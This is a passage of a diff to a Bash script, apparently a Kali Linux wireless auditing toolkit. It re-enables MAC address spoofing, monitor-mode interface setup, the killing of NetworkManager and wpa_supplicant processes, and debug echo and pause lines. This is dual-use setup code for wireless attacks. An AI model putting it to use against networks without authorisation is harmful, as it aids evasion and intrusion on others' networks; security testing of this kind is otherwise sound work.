+			interfaceMonitor=$(iwconfig | grep "wlan" | head -c 8)
 			interfaceMonitor="$interface""mon"
 			interfaceName=$interfaceMonitor
-			#fixKaliTwoMonError
+			fixKaliTwoMonError
 			;;
 
 		esac
@@ -6672,8 +6672,8 @@ getWirelessInterfaces(){
 		;;
 
 		"W" | "w")
-		#returnTo="getWirelessInterfaces"
-		#spoofMacAddress
+		returnTo="getWirelessInterfaces"
+		spoofMacAddress
 		getWirelessInterfaces
 		;;
 
@@ -6683,9 +6683,9 @@ getWirelessInterfaces(){
 
 	esac
 
-	#echo "$interface"
-	#echo "$interfaceMonitor"
-	#read pause
+	echo "$interface"
+	echo "$interfaceMonitor"
+	read pause
 
 }
 
@@ -6887,10 +6887,10 @@ killNetworkManager(){
 	currentPID=$(ps -A | grep NetworkManager | cut -c 1-5)
 	killTask=$(kill $currentPID)
 
-	#echo "$currentPID"
-	#echo "$killTask"
+	echo "$currentPID"
+	echo "$killTask"
 
-	#read pause
+	read pause
 
 }
 
@@ -6899,15 +6899,15 @@ wpaSupplicantKill(){
 
 	currentTask="wpaSupplicantKill"
 
-	#currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)
-	#killTask=$(kill $currentPID)
+	currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)
+	killTask=$(kill $currentPID)
 
 	killall wpa_supplicant
 
-	#echo "$currentPID"
-	#echo "$killTask"
+	echo "$currentPID"
+	echo "$killTask"
 
-	#read pause
+	read pause
 
 }
 
